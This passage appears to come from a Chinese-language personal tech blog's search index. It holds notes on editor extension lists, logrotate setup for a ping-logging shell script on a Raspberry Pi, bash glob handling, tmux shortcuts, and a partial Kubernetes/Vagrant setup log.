teamchilla.blueprint code –install-extension Tobermory.es6-string-html code –install-extension tomoki1207.pdf code –install-extension wwm.better-align code –install-extension Yukai.vscode-ptt code –install-extension zhuangtongfa.material-theme 家裡 code –install-extension alefragnani.project-manager code –install-extension bierner.emojisense code –install-extension bierner.markdown-checkbox code –install-extension bierner.markdown-emoji code –install-extension bierner.markdown-footnotes code –install-extension bierner.markdown-image-size code –install-extension bierner.markdown-preview-github-styles code –install-extension christian-kohler.path-intellisense code –install-extension codingyu.laravel-goto-view code –install-extension donjayamanne.githistory code –install-extension eamodio.gitlens code –install-extension esbenp.prettier-vscode code –install-extension felixfbecker.php-intellisense code –install-extension giladgray.theme-blueprint code –install-extension Gruntfuggly.todo-tree code –install-extension HackMD.vscode-hackmd code –install-extension humao.rest-client code –install-extension JakeWilson.vscode-cdnjs code –install-extension jkjustjoshing.vscode-text-pastry code –install-extension Kelvin.vscode-sshfs code –install-extension kokororin.vscode-phpfmt code –install-extension lannonbr.vscod","date":"2020-02-09","objectID":"/blog/posts/VScode-Sublime-%E4%BD%BF%E7%94%A8%E5%A5%97%E4%BB%B6%E6%95%B4%E7%90%86/:1:1","tags":["vscode","sublime"],"title":"VScode,Sublime 使用套件整理","uri":"/blog/posts/VScode-Sublime-%E4%BD%BF%E7%94%A8%E5%A5%97%E4%BB%B6%E6%95%B4%E7%90%86/"},{"categories":["實用工具"],"content":"Sublime 家裡 0_package_control_loader.sublime-package AdvancedNewFile.sublime-package Alignment.sublime-package ‘All Autocomplete.sublime-package’ ‘Bootstrap 3 Snippets.sublime-package’ BracketHighlighter.sublime-package ‘CodeIgniter Snippets.sublime-package’ ‘CodeIgniter Utilities.sublime-package’ DocBlockr.sublime-package Emmet.sublime-package FakeDataGenerator.sublime-package GhostText.sublime-package Goto-CSS-Declaration.sublime-package jQuery.sublime-package ‘Package Control.sublime-package’ ‘PHP Getters and Setters.sublime-package’ ‘Pretty JSON.sublime-package’ PyV8/ Sass.sublime-package SqlBeautifier.sublime-package StringEncode.sublime-package ‘Text Pastry.sublime-package’ ‘Vuejs Snippets.sublime-package’ 公司 ‘Pretty JSON’/ SFTP/ ‘0Sublimerge 3’/ ‘Theme - Default’/ User/ ","date":"2020-02-09","objectID":"/blog/posts/VScode-Sublime-%E4%BD%BF%E7%94%A8%E5%A5%97%E4%BB%B6%E6%95%B4%E7%90%86/:1:2","tags":["vscode","sublime"],"title":"VScode,Sublime 使用套件整理","uri":"/blog/posts/VScode-Sublime-%E4%BD%BF%E7%94%A8%E5%A5%97%E4%BB%B6%E6%95%B4%E7%90%86/"},{"categories":["Linux"],"content":"最近 Pi 2號機有時候 ssh 不穩 重開數據機或重插網路線就恢復正常 不知道是哪邊問題 想寫 ping log 來排除一些狀況 ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:0:0","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"ping shell 首先，我需要準備 ping 的 shell 程式 #!/bin/bash IP=$1 date \"+%Y-%m-%d %H:%M:%S\" echo \"PING HOST ${IP}\" while [ TRUE ] do ping -c 10 ${IP} sleep 300 #300秒檢查 done 開啟 tmux 分割多個視窗 ./test.sh \u003e ping_tw.yahoo.com.log 更多 ping 相關指令 Ping 指令用法教學：檢查網路連線狀態與品質 - G. T. Wang 備份圖 ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:1:0","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"沒辦法中斷(Ctrl + C) 程式 你无法用ctrl c 杀死的进程 - 简书 簡單解決方法，用 htop kill掉程式吧… ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:1:1","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"shell 比較要注意加\" 有兩種解決方法： if [ “$app-running” == \"\" ]; 或是 if [[ $app-running == \"\" ]]; Linux 的 shell script 中，遇到 unary operator expected 的解決方法 ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:1:2","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"shell error print Writing shell scripts - Lesson 14: Errors and Signals and Traps (Oh My!) - Part 1 ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:1:3","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"logrotate ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:2:0","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"更換 log 方法 其實 logrotate 切割 log 我有在想不會跟線上執行程式衝到嗎? Linux 日志切割神器 logrotate 原理介绍和配置详解 | HelloDog 備份圖 這邊裡面有詳細說明 如上也就是 logrotate 的默認操作方式，也就是 mv+create 執行完之後，通知應用重新在新文件寫入即可。mv+create 成本都比較低，幾乎是原子操作，如果應用支持重新打開日誌文件，如 syslog, nginx, mysql 等，那麼這是最好的方式。 不過，有些程序並不支持這種方式，壓根沒有提供重新打開日誌的接口；而如果重啟應用程序，必然會降低可用性，為此引入了如下方式。 這邊讓我想到之前有做，mv 跟 cp 實驗(cp 複製檔案可能沒注意的事情 | 程式狂想筆記) 我計畫使用 ./test.sh \u003e ping_tw.yahoo.com.log 但這個好像不可行 我是使用指令倒出 log ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:2:1","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"輸出問題 我想預防上述的問題 我想到下面方法 不過先說明以下 shell 不能正常執行 不過先說明以下 shell 不能正常執行 不過先說明以下 shell 不能正常執行 #!/bin/bash IP=$1 if [ \"${IP}\" = \"\" ];then echo \"must need put IP\" 1\u003e\u00262 exit 1 fi OUTLOG=\" \u003e\u003e ping_${IP}.log\" while [ TRUE ] do echo \"=========================================\" $OUTLOG echo \"=========================================\" $OUTLOG date \"+%Y-%m-%d %H:%M:%S\" $OUTLOG echo \"PING HOST: ${IP}\" $OUTLOG ping -c 10 ${IP} $OUTLOG sleep 300 #300秒檢查 done log() { if [ -n \"$logfile\" ]; then printf '%s\\n' \"$@\" \u003e\u003e \"$logfile\" else printf '%s\\n' \"$@\" fi } log \"$buf\" 可修正成這個方法shell script - Elegant solution to echo to either stdout or file in bash - Unix \u0026 Linux Stack Exchange 因為我比較懶行數比較少，所以我就寫在每一行 XD 但其實可以不用這樣寫 可參考後續文章 #!/bin/bash IP=$1 if [ \"${IP}\" = \"\" ];then echo \"must need put IP\" 1\u003e\u00262 exit 1 fi OUTLOG=\" \u003e\u003e ping_${IP}.log\" while [ TRUE ] do echo \"=========================================\" \u003e\u003e ping_${IP}.log echo \"=========================================\" \u003e\u003e ping_${IP}.log date \"+%Y-%m-%d %H:%M:%S\" \u003e\u003e ping_${IP}.log echo \"PING HOST: ${IP}\" \u003e\u003e ping_${IP}.log ping -c 10 ${IP} \u003e\u003e ping_${IP}.log sleep 300 #300秒檢查 done 這樣我應該就能使用 CREATE 機制 終於到我們重頭戲了 ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:2:2","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"logrotate ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:3:0","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"相關教學網站 [CENTOS7] 使用 logrotate 來整理wildfly日誌檔 @新精讚 Linux 日誌切割神器 logrotate 原理介紹和配置詳解 | HelloDog 使用 logrotate 定期整理 Rails Log 檔案 – ihower { blogging } linux 日志定时轮询流程详解 - 簡書 linux - How to insert a date inside the filename with logrotate - Stack Overflow linux 日志管理服务 logrotate | hatlonely的小站 linux - logrotate configuration file syntax - multiple wildcard entries possible? - Super User ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:3:1","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"logrotate 重點小記 相關自訂 logrotate 設定可放在 /etc/logrotate.d 原理可看Linux 日誌切割神器 logrotate 原理介紹和配置詳解 | HelloDog 運行機制 其實最原始的 conf設定在 /etc/logrotate.conf 看到include /etc/logrotate.d就能明白為什麼會自動載入 其他看到的重點 配置文件裡一定要配置 rotate 文件數目 這個參數。如果不配置默認是 0 個，也就是只允許存在一份日誌，剛切分出來的日誌會馬上被刪除。多麼痛的領悟，說多了都是淚。 執行 logrotate 命令最好加 -f 參數，不然有時候配置文件修改的內容不生效。 ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:3:2","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"我的 ping 程式設定 /home/pi/ping/ping_*.log { daily dateext missingok rotate 30 notifempty create 664 pi pi } ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:4:0","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"訊號問題 看到有些需要做 HUP 動作，讓程式重新讀 log 方法 使用create需要注意通知程式做，copytruncate 不需要做 create create 是默認的方案，可以通過 create 命令配置文件的權限和屬組設置。 這個方案的思路是：** 重命名原日誌文件，創建新的日誌文件 **。 詳細步驟如下： 1. 重命名正在輸出的日誌文件。 因為重命名只修改文件（目錄亦文件）的名稱，而進程操作文件使用的是 inode，所以並不影響原程序繼續輸出日誌。 2. 創建新的日誌文件。 文件名和原日誌文件一樣，注意，此時只是文件名稱一樣，而 inode 編號不同，程序輸出的日誌還是往原日誌文件輸出。 3. 最後通過某些方式通知程序，重新打開日誌文件。 由於重新打開日誌文件會用到文件路徑而非 inode 編號，所以打開的是新的日誌文件。 簡而言之，logrotate 的默認操作方式，就是 mv+create 執行完之後，通知應用重新在新文件寫入即可。mv+create 成本都比較低，幾乎是原子操作，如果應用支\u003e 持重新打開日誌文件，如 syslog、 nginx、mysql 等，那麼這是最好的方式。 不過，有些程序並不支持這種方式，壓根兒沒有提供重新打開日誌的接口，而如果重啟應用程序，必然會降低可用性，為此引入了 copytruncate 方式。 copytruncate copytruncate 是把正在輸出的日誌拷（copy）一份出來，再清空 （trucate）原來的日誌。 詳細步驟如下： 1. 將當前正在輸出的日誌文件複製為目標文件，此時程序仍然將日誌輸出到原來文件中，原文件名也沒有變。 2. 清空原日誌文件，程序仍然還是輸出到原日誌文件中，因為清空文件只把文件的內容刪除了，而 inode 並沒改變。 所以 copytruncate 也就是先複製一份文件，然後清空原有文件。 通常來說，清空操作比較快，但是如果日誌文件太大，那麼複製就會比較耗時，從而可能導致部分日誌丟失。不過這種方式不需要應用程序的支持即可使用。 參考：Linux 日志切割工具 Logrotate | PwD linux 日志定时轮询流程详解(logrotate) - 生活费 - 博客园 kill -HUP 命令的使用-赤练挚爱-51CTO博客 ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:5:0","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"意外小實驗結果 雖然不是很清楚他的原理，但我剛剛做一個實驗 得出很有趣的結果 如果是用 \u003e 重定向輸出的日誌，如 test_app \u003e stdout.log, copytruncate 則無法裁剪原始日誌文件 stdout.log, 它將持續增漲下去。而用 » 就沒問題了，test-app » stdout.log，日誌滾動後 stdout.log 大小將變為零。 Linux 下配置滚动日志之 logrotate | 隔叶黄莺 Yanbin Blog - 软件编程实践 這邊把 ping.sh 標準輸出註解掉了 #!/bin/bash IP=$1 if [ \"${IP}\" = \"\" ];then echo \"must need put IP\" 1\u003e\u00262 exit 1 fi OUTLOG=\" \u003e\u003e ping_${IP}.log\" while [ TRUE ] do echo \"=========================================\" #\u003e\u003e ping_${IP}.log echo \"=========================================\" #\u003e\u003e ping_${IP}.log date \"+%Y-%m-%d %H:%M:%S\" #\u003e\u003e ping_${IP}.log echo \"PING HOST: ${IP}\" #\u003e\u003e ping_${IP}.log ping -c 10 ${IP} #\u003e\u003e ping_${IP}.log #sleep 300 #300秒檢查 done ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:5:1","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"使用 create 做 ./ping.sh 127.0.0.1 » ping_127.0.0.1.log 做 logrotate(sudo logrotate -vf /etc/logrotate.d/ping) 後會產生ping_127.0.0.1.log,ping_127.0.0.1.log-2020-01-27 程式持續跑的log會加在ping_127.0.0.1.log-2020-01-27 如果還記得流程的話，上面有說要 HUP 通知信號跟程式講重抓 log 寫入設定檔 3. 最後通過某些方式通知程序，重新打開日誌文件。 由於重新打開日誌文件會用到文件路徑而非 inode 編號，所以打開的是新的日誌文件。 ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:5:2","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"使用 copytruncate 做 ./ping.sh 127.0.0.1 » ping_127.0.0.1.log 做 logrotate(sudo logrotate -vf /etc/logrotate.d/ping) 後會產生ping_127.0.0.1.log,ping_127.0.0.1.log-2020-01-27 程式持續跑的log會加在ping_127.0.0.1.log 但聽說這種作法有機率遺失 log ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:5:3","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"\u003e 這個應該沒什麼機會用到 但對 create , copytruncate 都會造成 log 紀錄有問題 結果我就不貼了 ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:6:0","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"測試使用 建議加 sudo root執行 sudo logrotate /etc/logrotate.d/ping 執行 logrotate sudo logrotate -d /etc/logrotate.d/ping 測試日誌切割 (如果文件的時間小於一天，不會執行切割日誌 ) sudo logrotate -vf /etc/logrotate.d/ping 強制輪詢切割日誌 ( 為了便於我們直觀的觀察測試結果,建議大家手動試一下 ) -f (–force), 就是把不管日誌文件大小是否符合要求，強制執行日誌滾動操作 參照:linux环境下使用logrotate工具实现nginx日志切割 - 知乎 ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:7:0","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"測試完建議刪除檔案 測試完建議刪除檔案，否則會出現如下錯誤 error: destination /home/pi/ping/ping_127.0.0.1.log-20200127 already exists, skipping rotation linux - logrotate suffix: dateext + rotate - Stack Overflow 最後 shell 用 tmux 爽爽執行 ping.sh 程式 ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:7:1","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"logrotate 配置選項 常用選項： daily - 指定轉儲週期為每天 weekly - 指定轉儲週期為每週 monthly - 指定轉儲週期為每月 rotate count - 指定日誌文件刪除之前轉儲的次數，0 指沒有備份，5 指保留 5 個備份 tabooext [+] list - 讓 logrotate 不轉儲指定擴展名的文件，缺省的擴展名是：.rpm-orig、.rpmsave、v 和 ～ missingok - 在日誌輪循期間，任何錯誤將被忽略，例如 * 文件無法找到 * 之類的錯誤 size size - 當日誌文件到達指定的大小時才轉儲，bytes (缺省) 及 KB (sizek) 或 MB (sizem) compress - 通過 gzip 壓縮轉儲以後的日誌 nocompress - 不壓縮 copytruncate - 用於還在打開中的日誌文件，把當前日誌備份並截斷 nocopytruncate - 備份日誌文件但是不截斷 create mode owner group - 轉儲文件，使用指定的文件模式創建新的日誌文件 nocreate - 不建立新的日誌文件 delaycompress - 和 compress 一起使用時，轉儲的日誌文件到下一次轉儲時才壓縮 nodelaycompress - 覆蓋 delaycompress 選項，轉儲同時壓縮。 errors address - 轉儲時的錯誤信息發送到指定的 Email 地址 ifempty - 即使是空文件也轉儲，這是 logrotate 的缺省選項。 notifempty - 如果是空文件的話，不轉儲 mail address - 把轉儲的日誌文件發送到指定的 E-mail 地址 nomail - 轉儲時不發送日誌文件 olddir directory - 儲後的日誌文件放入指定的目錄，必須和當前日誌文件在同一個文件系統 noolddir - 轉儲後的日誌文件和當前日誌文件放在同一個目錄下 prerotate/endscript - 在轉儲以前需要執行的命令可以放入這個選項對之間，這兩個關鍵字必須單獨成行 sharedscripts - 默認情況下，prerotate/endscript 內定義的命令會對匹配到的所有文件 (比如： /var/log/news/*）都執行一次，如果指定為 sharedscripts，則這些命令只會執行一次 dateext - 對於轉儲的日誌文件加上日期後綴 參考:Linux 日誌切割工具 Logrotate | PwD 備份圖 ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:7:2","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"總結 其實這篇不重要刪減，所以看的內容非常雜 不過經過這次實驗有清楚了解到要怎麼使用 logrotate 後續如果程式要做 HUP 訊號要怎麼處理?之後有空在研究 ","date":"2020-01-27","objectID":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/:8:0","tags":["linux","log"],"title":"logrotate 自動切割 log 小記","uri":"/blog/posts/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"以前 ls 萬用字元真的很方便 ls *.jpg 這樣可以列出很多 *.jpg 圖片 但是有些細節沒有釐清 偶爾會遇到不能用的狀況下 今天終於徹底了解 2021-07-25 最近才發現這有專有名稱叫做glob ","date":"2020-01-21","objectID":"/blog/posts/linux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85/:0:0","tags":["bash","shell"],"title":"linux bash / shell 有關 * 星號的事情(glob)","uri":"/blog/posts/linux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["Linux"],"content":"釐清 * echo * # file list...(ex: xxx.jpg ffff.jpg) 就是現在目錄抓到相關檔案名稱 這也是為什麼? 原理就這麼簡單 但我這邊沒講更細 下面 shopt -s nullglob 會提到 ","date":"2020-01-21","objectID":"/blog/posts/linux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85/:1:0","tags":["bash","shell"],"title":"linux bash / shell 有關 * 星號的事情(glob)","uri":"/blog/posts/linux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["Linux"],"content":"shell array 應用 jpgs=(*.jpg) 這樣看似可以用 但沒有 jpg ，就會產生 *.jpg 這邊要小心 這邊也是有辦法解決 shopt -s nullglob # bash unsetopt nomatch # zsh files=(xorg-x11-fonts*) if [ -e \"${files[0]}\" ]; then printf \"BLAH\" fi 參考:sh - Check if a file exists with wildcard in shell script - Stack Overflow ","date":"2020-01-21","objectID":"/blog/posts/linux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85/:2:0","tags":["bash","shell"],"title":"linux bash / shell 有關 * 星號的事情(glob)","uri":"/blog/posts/linux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["Linux"],"content":"shopt -s nullglob shopt -s nullglob # enable shopt -u nullglob # disable echo my*file my*file shopt -s nullglob echo my*file # 不會印出東西 參考: linux:以下shell選項的含義是什麼 - shopt -s nullglob \\ textglob - Codebug #!/bin/sh old=$(pwd) [ $# -lt 2 ] \u0026\u0026 echo -e \"\\t[Info] Give arg1=Folder path; arg2=File extension!\\n\" \u0026\u0026 exit 1 [ -d $1 ] \u0026\u0026 cd $1 || exit 2 shopt -s nullglob found=0 for i in *.$2; do echo \"File $i found\" # or take other action found=1 done shopt -u nullglob [ $found -eq 0 ] \u0026\u0026 echo \"Directory is empty\" cd $old // List all file with extension .mp3 under folder ’empty' ./listFE.sh empty mp3 File test.mp3 found 以上參考:程式扎記: [Linux 文章收集] Use BASH nullglob To Verify *.c Files Exists or Not In a Directory 當然也有別的解決方案 ","date":"2020-01-21","objectID":"/blog/posts/linux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85/:2:1","tags":["bash","shell"],"title":"linux bash / shell 有關 * 星號的事情(glob)","uri":"/blog/posts/linux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["Linux"],"content":"test -f *.jpg 我公司有古早程式這樣寫 但會遇到一些問題 除了上述解決方法 還有一種是 files=$(ls /tmp/*.cache 2\u003e /dev/null | wc -l) if [ \"$files\" != \"0\" ] then echo \"Cache files exist: do something with them\" else echo \"No cache files...\" fi ","date":"2020-01-21","objectID":"/blog/posts/linux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85/:3:0","tags":["bash","shell"],"title":"linux bash / shell 有關 * 星號的事情(glob)","uri":"/blog/posts/linux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["Linux"],"content":"find 方法(多層搜尋方法) files=$(find /tmp -type f -name \"*.cache\" | wc -l) if [ \"$files\" != \"0\" ] then echo \"Cache files exist: do something with them\" else echo \"No cache files...\" fi find 搜尋也可以加 or 條件 再多個搜尋也是很方便 find /tmp -type f -name \"*.mpg\" -o -name \"*.jpg\" 更多方法可以看:Bash tips: if -e wildcard file check =\u003e [: too many arguments - MDLog:/sysadmin 相關連結: bash - Use asterisk in variables - Unix \u0026 Linux Stack Exchange sh - Check if a file exists with wildcard in shell script - Stack Overflow How to Check / Test if a File or Directory Exists in Bash Bash tips: if -e wildcard file check =\u003e [: too many arguments - MDLog:/sysadmin 電腦各種符號英文唸法 | 阿維雜記本 (Wei’s Blog) linux - bash, detecting mp4 files - Stack Overflow 关于bash：确认是否存在一个或多个目录 | 码农家园 ","date":"2020-01-21","objectID":"/blog/posts/linux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85/:4:0","tags":["bash","shell"],"title":"linux bash / shell 有關 * 星號的事情(glob)","uri":"/blog/posts/linux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["Linux"],"content":"之前就想記錄 tmux 跟 screen 但這兩個不熟 久而久之沒用，之前指令就忘記一大辦 最近又稍微用了一下 tmux 才突然想到之前就想紀錄 tmux tmux tmux a -t _number_ tmux at tmux kill-server tmux 裡面可以操作指令 # 先按 Ctrl + b 再 d Ctrl+ b 和 d Ctrl+ b 和 c Ctrl+ b 和 w Ctrl+ b 和 n Ctrl+ b 和 p Ctrl+ b 和 % Ctrl+ b 和 / Ctrl+ b 和 \" Ctrl+ b 和 _方向鍵_ Ctrl+ b 和 Ctrl+_方向鍵_ Tech黑手 - 工作雜記: TMUX (Terminal MUltipleXer ) 終端機 session 管理神器 — tmux - Larry・Blog tmux 快速入門筆記 | DEVLOG of andyyou ","date":"2020-01-13","objectID":"/blog/posts/tmux-%E6%8E%A7%E5%88%B6%E7%B5%82%E7%AB%AF%E6%A9%9F%E5%A5%BD%E5%B7%A5%E5%85%B7/:0:0","tags":["tmux"],"title":"tmux 控制終端機好工具","uri":"/blog/posts/tmux-%E6%8E%A7%E5%88%B6%E7%B5%82%E7%AB%AF%E6%A9%9F%E5%A5%BD%E5%B7%A5%E5%85%B7/"},{"categories":["Kubernetes"],"content":"尚未整理完成 ","date":"2020-01-12","objectID":"/blog/posts/Kubernetes-%E9%9B%9C%E8%A8%98/:0:0","tags":["k8s"],"title":"Kubernetes 雜記","uri":"/blog/posts/Kubernetes-%E9%9B%9C%E8%A8%98/"},{"categories":["Kubernetes"],"content":"Vagrant+Virtailbox 架設環境 安裝 Vagrant Virtalbox git clone pires/kubernetes-vagrant-coreos-cluster: Kubernetes cluster (for testing purposes) made easy with Vagrant and CoreOS. 上面會遇到如下問題 WARNING: Vagrant has detected the `vagrant-triggers` plugin. This plugin conflicts with the internal triggers implementation. Please uninstall the `vagrant-triggers` plugin and run the command again if you wish to use the core trigger feature. To uninstall the plugin, run the command shown below: vagrant plugin uninstall vagrant-triggers Note that the community plugin `vagrant-triggers` and the core trigger feature in Vagrant do not have compatible syntax. To disable this warning, set the environment variable `VAGRANT_USE_VAGRANT_TRIGGERS`. Installed Version: 2.2.4 Latest Version: 2.2.6 但好像不用理這個 ecomm-integration-ballerina/kubernetes-cluster: Kubernetes cluster using Vagrant, VirtualBox and Kubeadm Multi Node Kubernetes Cluster with Vagrant, VirtualBox and Kubeadm 別的也有這個kubernetes-vagrant-centos-cluster/README-cn.md at master · rootsongjc/kubernetes-vagrant-centos-cluster vagrant up 會遇到錯誤 ... ==\u003e master: Running triggers before up... ==\u003e master: 2020-01-14 22:11:00 +0800: setting up Kubernetes master... ==\u003e master: Setting Kubernetes version 1.10.9 ==\u003e master: Box 'coreos-alpha' could not 